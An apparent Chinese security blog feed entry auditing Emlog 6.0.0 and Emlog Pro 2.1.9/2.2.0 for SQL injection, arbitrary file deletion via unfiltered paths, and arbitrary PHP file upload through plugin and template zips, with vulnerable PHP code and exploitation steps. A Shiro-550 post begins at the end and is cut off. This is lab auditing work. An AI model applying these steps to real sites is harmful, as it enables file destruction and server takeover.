    <url>/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id><a href="#" class="headerlink" title></a></h1><p>emlog6.0.0 &amp;pro2.1.9&amp;&amp;pro2.2.0</p><span id="more"></span><h1 id="emlog-6-0-0"><a href="#emlog-6-0-0" class="headerlink" title="emlog 6.0.0"></a>emlog 6.0.0</h1><h1 id="一-环境"><a href="#一-环境" class="headerlink" title="一.环境"></a>一.环境</h1><ul><li><a href="https://www.emlog.net/">https://www.emlog.net/</a> 官网下载源码</li></ul><h1 id="二-sql注入漏洞"><a href="#二-sql注入漏洞" class="headerlink" title="二.sql注入漏洞"></a>二.sql注入漏洞</h1><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>comment.php文件里面没有对变量$action的定义，看到有加载globals.php</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250527191842455-17483447258463-17496368553791.png"></p><p>是get接受action参数，且addslashes过滤</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250527191945049-17483447862244-17496368582652.png"></p><p>漏洞在这段代码处，$ip接收的参数没有进行过滤，可控，接着跟进delCommentByIp</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250527193049967-17483454536735-17496368601833.png"></p><p>单引号闭合，并且只进行sql语句执行，没有输出，所以我们在注入的时候就得采取报错注入或盲注了</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250527193322561-17483456054356.png"></p><p>尝试，报错权限不足</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250527194108083-17483460689968.png"></p><p>找到代码发现，报错的原因是还要接受一个后台登陆成功后的token</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250527194053973-17483460560057.png"></p><p>返回登录界面获得token</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250527194630681-17483463942559.png"></p><p>它输出了sql语句，说明参数全了能成功去执行sql语句</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250527194733306-174834645511510.png"></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>上面说没有返回执行sql的结果没有输出，就盲注或报错注</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250527201051777-174834785306711.png"></p><p>但总的来说它得进后台获得token才能注入就很尴尬了</p><h1 id="三-任意文件删除漏洞"><a href="#三-任意文件删除漏洞" class="headerlink" title="三.任意文件删除漏洞"></a>三.任意文件删除漏洞</h1><h2 id="任意删除1"><a href="#任意删除1" class="headerlink" title="任意删除1"></a>任意删除1</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>admin&#x2F;data.php 中，未过滤bak[]</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250527203442664-174834928396912.png"></p><ul><li><p><code>unlink()</code> 函数删除文件。</p><p>若成功，则返回 true，失败则返回 false。</p></li></ul><h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>在src目录下创建deled.txt文件</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250527205819187-174835070033514.png"></p><p>post 提交参数bak[],进行跨目录删除文件</p><ul><li>注意参数是数组啊！！</li></ul><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250527210529116-174835113034016.png"></p><p>deled.txt成功删除</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250527210505023-174835110628215.png"></p><h2 id="任意删除2"><a href="#任意删除2" class="headerlink" title="任意删除2"></a>任意删除2</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>还是危险函数unlink，参数$icon_1没过滤</p><p>但参数$icon_1是从数据库查询字段photo后返回的结果，考虑怎么把任意路径写进去</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250527214929298-174835377034917.png"></p><p>看到update功能可以操作一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$action</span> == <span class="hljs-string">&#x27;update&#x27;</span>) &#123;<br>    <span class="hljs-title class_">LoginAuth</span>::<span class="hljs-title function_ invoke__">checkToken</span>();<br>    <span class="hljs-variable">$User_Model</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User_Model</span>();<br>    <span class="hljs-comment">// 通过POST参数控制photo字段,可以传入任意文件路径</span><br>    <span class="hljs-variable">$photo</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]) ? <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] : <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$nickname</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) ? <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) : <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$email</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]) ? <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>])) : <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$description</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;description&#x27;</span>]) ? <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;description&#x27;</span>])) : <span class="hljs-string">&#x27;&#x27;</span>;<br><br>    <span class="hljs-variable">$login</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) ? <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>])) : <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$newpass</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;newpass&#x27;</span>]) ? <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;newpass&#x27;</span>])) : <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$repeatpass</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;repeatpass&#x27;</span>]) ? <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;repeatpass&#x27;</span>])) : <span class="hljs-string">&#x27;&#x27;</span>;<br><br>    <span class="hljs-comment">// 移除对photo的addslashes处理,允许传入任意路径</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$nickname</span>) &gt; <span class="hljs-number">20</span>) &#123;<br>        <span class="hljs-title function_ invoke__">emDirect</span>(<span class="hljs-string">&quot;./blogger.php?error_a=1&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$email</span> != <span class="hljs-string">&#x27;&#x27;</span> &amp;&amp; !<span class="hljs-title function_ invoke__">checkMail</span>(<span class="hljs-variable">$email</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">emDirect</span>(<span class="hljs-string">&quot;./blogger.php?error_b=1&quot;</span>);<br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$newpass</span>)&gt;<span class="hljs-number">0</span> &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$newpass</span>) &lt; <span class="hljs-number">6</span>) &#123;<br>        <span class="hljs-title function_ invoke__">emDirect</span>(<span class="hljs-string">&quot;./blogger.php?error_c=1&quot;</span>);<br>    &#125; <span class="hljs-keyword">elseif</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$newpass</span>) &amp;&amp; <span class="hljs-variable">$newpass</span> != <span class="hljs-variable">$repeatpass</span>) &#123;<br>        <span class="hljs-title function_ invoke__">emDirect</span>(<span class="hljs-string">&quot;./blogger.php?error_d=1&quot;</span>);<br>    &#125; <span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$User_Model</span>-&gt;<span class="hljs-title function_ invoke__">isUserExist</span>(<span class="hljs-variable">$login</span>, UID)) &#123;<br>        <span class="hljs-title function_ invoke__">emDirect</span>(<span class="hljs-string">&quot;./blogger.php?error_e=1&quot;</span>);<br>    &#125; <span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$User_Model</span>-&gt;<span class="hljs-title function_ invoke__">isNicknameExist</span>(<span class="hljs-variable">$nickname</span>, UID)) &#123;<br>        <span class="hljs-title function_ invoke__">emDirect</span>(<span class="hljs-string">&quot;./blogger.php?error_f=1&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$newpass</span>)) &#123;<br>        <span class="hljs-variable">$PHPASS</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PasswordHash</span>(<span class="hljs-number">8</span>, <span class="hljs-literal">true</span>);<br>        <span class="hljs-variable">$newpass</span> = <span class="hljs-variable">$PHPASS</span>-&gt;<span class="hljs-title function_ invoke__">HashPassword</span>(<span class="hljs-variable">$newpass</span>);<br>        <span class="hljs-variable">$User_Model</span>-&gt;<span class="hljs-title function_ invoke__">updateUser</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;password&#x27;</span>=&gt;<span class="hljs-variable">$newpass</span>), UID);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$login</span>)) &#123;<br>        <span class="hljs-variable">$User_Model</span>-&gt;<span class="hljs-title function_ invoke__">updateUser</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;username&#x27;</span>=&gt;<span class="hljs-variable">$login</span>), UID);<br>    &#125;<br><br>    <span class="hljs-comment">// 直接使用传入的photo路径,不进行文件上传处理</span><br>    <span class="hljs-variable">$usericon</span> = <span class="hljs-variable">$photo</span>;<br>    <br>    <span class="hljs-comment">// 更新用户信息,将photo字段设置为任意路径</span><br>    <span class="hljs-variable">$User_Model</span>-&gt;<span class="hljs-title function_ invoke__">updateUser</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;nickname&#x27;</span>=&gt;<span class="hljs-variable">$nickname</span>, <span class="hljs-string">&#x27;email&#x27;</span>=&gt;<span class="hljs-variable">$email</span>, <span class="hljs-string">&#x27;photo&#x27;</span>=&gt;<span class="hljs-variable">$usericon</span>, <span class="hljs-string">&#x27;description&#x27;</span>=&gt;<span class="hljs-variable">$description</span>), UID);<br>    <span class="hljs-variable">$CACHE</span>-&gt;<span class="hljs-title function_ invoke__">updateCache</span>(<span class="hljs-string">&#x27;user&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">emDirect</span>(<span class="hljs-string">&quot;./blogger.php?active_edit=1&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$action</span> == <span class="hljs-string">&#x27;delicon&#x27;</span>) &#123;<br>    <span class="hljs-title class_">LoginAuth</span>::<span class="hljs-title function_ invoke__">checkToken</span>();<br>    <span class="hljs-variable">$DB</span> = <span class="hljs-title class_">Database</span>::<span class="hljs-title function_ invoke__">getInstance</span>();<br>    <span class="hljs-comment">// 从数据库获取photo字段,此时photo字段已被设置为任意路径</span><br>    <span class="hljs-variable">$query</span> = <span class="hljs-variable">$DB</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;select photo from &quot;</span>.DB_PREFIX.<span class="hljs-string">&quot;user where uid=&quot;</span> . UID);<br>    <span class="hljs-variable">$icon</span> = <span class="hljs-variable">$DB</span>-&gt;<span class="hljs-title function_ invoke__">fetch_array</span>(<span class="hljs-variable">$query</span>);<br>    <span class="hljs-variable">$icon_1</span> = <span class="hljs-variable">$icon</span>[<span class="hljs-string">&#x27;photo&#x27;</span>];<br>    <span class="hljs-comment">// 直接删除指定路径的文件</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$icon_1</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$icon_1</span>);<br>    &#125;<br>    <span class="hljs-variable">$DB</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;UPDATE &quot;</span>.DB_PREFIX.<span class="hljs-string">&quot;user SET photo=&#x27;&#x27; where uid=&quot;</span> . UID);<br>    <span class="hljs-variable">$CACHE</span>-&gt;<span class="hljs-title function_ invoke__">updateCache</span>(<span class="hljs-string">&#x27;user&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">emDirect</span>(<span class="hljs-string">&quot;./blogger.php?active_del=1&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>主要看这里！！！更新的photo字段是变量$usericon接受未过滤的photo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-variable">$photo</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]) ? <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] : <span class="hljs-string">&#x27;&#x27;</span>;  <br><br><span class="hljs-comment">// 直接使用传入的photo路径,不进行文件上传处理</span><br>    <span class="hljs-variable">$usericon</span> = <span class="hljs-variable">$photo</span>;   <br><span class="hljs-comment">// 更新用户信息,将photo字段设置为任意路径</span><br><span class="hljs-variable">$User_Model</span>-&gt;<span class="hljs-title function_ invoke__">updateUser</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;nickname&#x27;</span>=&gt;<span class="hljs-variable">$nickname</span>, <span class="hljs-string">&#x27;email&#x27;</span>=&gt;<span class="hljs-variable">$email</span>, <span class="hljs-string">&#x27;photo&#x27;</span>=&gt;<span class="hljs-variable">$usericon</span>, <span class="hljs-string">&#x27;description&#x27;</span>=&gt;<span class="hljs-variable">$description</span>), UID);<br></code></pre></td></tr></table></figure><h3 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h3><p>$action&#x3D;update      $action&#x3D;delicon</p><p>在plug.php的上级目录创建文件x.txt</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250528084242617-174839296453620.png"></p><p>update</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250528091104379-174839466570624.png"></p><p>delicon</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250528085234505-174839355609123.png"></p><p>成功删除x.php</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250528085204704-174839352672622.png"></p><h1 id="四-文件上传漏洞"><a href="#四-文件上传漏洞" class="headerlink" title="四.文件上传漏洞"></a>四.文件上传漏洞</h1><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>$zipfile变量没有经过过滤，直接接受上传的文件信息</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250528145247462-174841516911925.png"></p><p>对接受的文件名用getFileSuffix函数获取文件后缀名判断是否是zip,之后解压到..&#x2F;content&#x2F;plugins目录下</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250528145500458-174841530199526.png"></p><p>跟进emUnZip函数</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250528151113909-174841627924828.png"></p><h3 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h3><p>直接上传，发现</p><p>、<img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250528154101980-174841806444629.png"></p><p>从源码中找到报错的出处，emUnZip返回了-1</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250528154140780-174841810192531.png"></p><p>让ai分析一下，返回-1是因为压缩文件中，没有插件目录名！！！，先把emlog.php文件放在同名的文件夹下面，再进行压缩就可以了</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250528154857839-174841853976132.png"></p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250528201105951-174843426769933.png"></p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250528201735556-174843465655534.png"></p><p>参考文章：</p><p><a href="https://forum.butian.net/share/2285">https://forum.butian.net/share/2285</a></p><p><a href="http://www.52bug.cn/hkjs/5666.html">http://www.52bug.cn/hkjs/5666.html</a></p><h1 id="——————"><a href="#——————" class="headerlink" title="——————-"></a>——————-</h1><h1 id="emlog-pro-2-1-9"><a href="#emlog-pro-2-1-9" class="headerlink" title="emlog_pro 2.1.9"></a>emlog_pro 2.1.9</h1><h2 id="一-sql注入-备份数据库二次注入"><a href="#一-sql注入-备份数据库二次注入" class="headerlink" title="一.sql注入(备份数据库二次注入)"></a>一.sql注入(备份数据库二次注入)</h2><blockquote><p>跟踪危险函数找到sql语句执行找注入</p><p>根据数据库监控找注入</p></blockquote><p><strong>数据库监控</strong></p><p><a href="https://gitcode.com/gh_mirrors/my/MySQL-Monitor/?utm_source=artical_gitcode&index=top&type=href&&isLogin=1">https://gitcode.com/gh_mirrors/my/MySQL-Monitor/?utm_source=artical_gitcode&amp;index=top&amp;type=href&amp;&amp;isLogin=1</a></p><p>再项目目录下创建一个文件夹存放数据库监控</p><p><strong>注入点的寻找：</strong></p><ul><li><p>从漏洞报告中知道漏洞文件目录 &#x2F;admin&#x2F;user.php</p></li><li><p>【从执行的sql语句中入手找对应的代码段分析】根据数据库监控找sql注入点：访问user.php页面加载数据包执行sql语句，在数据库监控中寻找可疑的sql语句(有可控点的)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">AS</span> total <span class="hljs-keyword">FROM</span> emlog_user <span class="hljs-keyword">where</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>  #这个就是已经写死的，不可控<br></code></pre></td></tr></table></figure><p>asdf是登陆的用户名，锁定他在源码中找是否可控，分析它从哪里来</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250529150536916-174850233844238.png"></p></li><li><p>在源码中正则表达式找sql语句出处，分析参数是否过滤，从哪里可以注入</p></li></ul><h3 id="寻找可控出处"><a href="#寻找可控出处" class="headerlink" title="寻找可控出处"></a>寻找可控出处</h3><h4 id="代码分析参数"><a href="#代码分析参数" class="headerlink" title="代码分析参数"></a>代码分析参数</h4><p>$condition如果可控的话，这条sql就可控，那就在源码中去分析</p><p>可以看到$condition是与$email $nickname有关的</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250528221953284-174844199436637.png"></p><p>而$email $nickname赋为空值，从代码上看这里是控制不了了</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250529153826826-174850430836839.png"></p><h4 id="添加用户尝试控制"><a href="#添加用户尝试控制" class="headerlink" title="添加用户尝试控制"></a>添加用户尝试控制</h4><p>但回看上面数据库监控的sql语句的可控的点是我们后台管理员登陆的用户名，想的是再创建一个是payload的用户名，但是欸，创建用户不能自己创建用户名</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250529154529615-174850473097740.png"></p><p>用户名是随机的，但是我们也知道了这个操作的参数active_add</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250529154753588-174850487488841.png"></p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250529154929751-174850497120142.png"></p><p>跟进去看确实用户名是随机产生的</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250529155035299-174850503641243.png"></p><hr><p><strong>到这里我们审计代码是没有找到可利用的地方能控制$condition进行sql语句拼接的，就想到二次注入，在网站上寻找与数据库相关的功能点</strong></p><p>找到备份数据库，再备份文件中发现刚刚操作的sql语句，现在猜想导入备份会不会执行sql语句</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250529160129193-174850569042244.png"></p><p>所以从代码上面看主要漏洞是在这里data.php  导入数据库备份时执行sql语句</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250529161805254-174850668655447.png"></p><h3 id="利用-4"><a href="#利用-4" class="headerlink" title="利用"></a>利用</h3><p>将payload添加进备份文件中</p><p>导入备份文件，成功执行</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250529160451654-174850589572245.png"></p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250529160604808-174850596679046.png"></p><h1 id="——————-1"><a href="#——————-1" class="headerlink" title="——————-"></a>——————-</h1><h1 id="emlog-pro-2-2-0"><a href="#emlog-pro-2-2-0" class="headerlink" title="emlog_pro 2.2.0"></a>emlog_pro 2.2.0</h1><p>CNVD-2023-74536</p><h2 id="任意文件上传漏洞1"><a href="#任意文件上传漏洞1" class="headerlink" title="任意文件上传漏洞1"></a>任意文件上传漏洞1</h2><p>报告里写content&#x2F;templates,可以直接根据这里找模板的操作(一个模板是一个文件夹)，所以漏洞大概与模板有关</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250529191717147-174851743830748.png"></p><p>php文件上传的固定全局变量$_FILES接受上传的文件信息，文件上传处理函数move_uploaded_file</p><p><strong>文件上传与数据库监控的关联：</strong><br>当上传文件路径写入数据库中是用数据库监控找</p><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p><strong>通过关键字定位代码：</strong><br>搜安装&#x2F;上传，找到view&#x2F;templates.php这个文件，对应处理逻辑的文件是admin&#x2F;templates.php</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250529192721888-174851804301249.png"></p><p>可以看到它和之前逻辑差不多，上传成功解压到..&#x2F;content&#x2F;templates&#x2F;目录下，但自定义的emUnZip函数肯定之前6.0.0相比检测方式不同了<img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250529200059340-174852006063950.png"></p><p>解压函数会检测里面的header.php文件</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250529201022075-174852062328952.png"></p><p>所以之前6.0.0的利用肯定不能用，emUnZip函数返回-2，因为没有检测到header.php</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250529200714620-174852043575951.png"></p><h3 id="利用-5"><a href="#利用-5" class="headerlink" title="利用"></a>利用</h3><p>这里直接将php文件和header.php放在一个文件夹(文件夹的名字就是模块的名字)下面直接压缩就好了</p><p>上传成功</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250529202319928-174852140094055.png"></p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250529203312044-174852199284057.png"></p><h2 id="任意文件上传2"><a href="#任意文件上传2" class="headerlink" title="任意文件上传2"></a>任意文件上传2</h2><p>和刚刚这个代码逻辑是一样的</p><p>对admin&#x2F;plugin.php文件进行分析，大多都一样，但检测方式发生了变化，刚刚是按照模板，现在是插件</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250529210415531-174852385675562.png"></p><p>然后注意这里就不是检测header.php文件了，检测和6.0.0的一样要求目录下面存在一个与目录名相同的php文件</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250529213624462-174852578559263.png"></p><p>上传成功</p><p><img src="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250529213711832-174852583283964.png"></p><p>最简单的方法就是找现有的插件，直接利用它往里面放php文件</p>]]></content>
    
    
    <categories>
      
      <category>php代码审计</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>shiro-550</title>
    <link href="/2025/05/23/Shiro-550/"/>
    <url>/2025/05/23/Shiro-550/</url>
    
    <content type="html"><![CDATA[<p>URLDNS验证！CC！CB！</p><span id="more"></span><h1 id="一-环境配置"><a href="#一-环境配置" class="headerlink" title="一.环境配置"></a>一.环境配置</h1><ul><li><p>源码</p><p><a href="https://github.com/phith0n/JavaThings/tree/master">https://github.com/phith0n/JavaThings/tree/master</a></p></li><li><p>在IDEA打开源码</p></li><li><p>运行tomcat服务</p></li></ul><p>之后启动时，报404，要加上这两个</p><p><img src="/2025/05/23/Shiro-550/image-20250515142811341-17478128961311-174798701504259.png"></p><p>localhost:8123访问tomcat启动成功，然后直接用上下文路径访问(<a href="http://localhost:8123/shirodemo_war/login.jsp">http://localhost:8123/shirodemo_war/login.jsp</a>)</p><p>tomcat自己不知道怎么就关了，直接在jdk中运行也是一样的</p><p>然后浏览器插件设置代理模式端口8100，bp监听8100</p><p>localhost抓不到包，用IPV4的ip去替换访问就可以抓到包了</p><p>root，secret 勾选rememberMe登录抓包，看到向浏览器返回了rememberMe记录身份信息的，下一次就可以直接登录</p><p><img src="/2025/05/23/Shiro-550/image-20250521151220835-17478129020163-174798701216458.png"></p><p>下一次直接成功登录了，接下来去分析源码的具体逻辑</p><p><img src="/2025/05/23/Shiro-550/image-20250521151715734-17478129054414-174798676392552.png"></p><h1 id="二-逆向分析"><a href="#二-逆向分析" class="headerlink" title="二.逆向分析"></a>二.逆向分析</h1><h2 id="解密，反序列化"><a href="#解密，反序列化" class="headerlink" 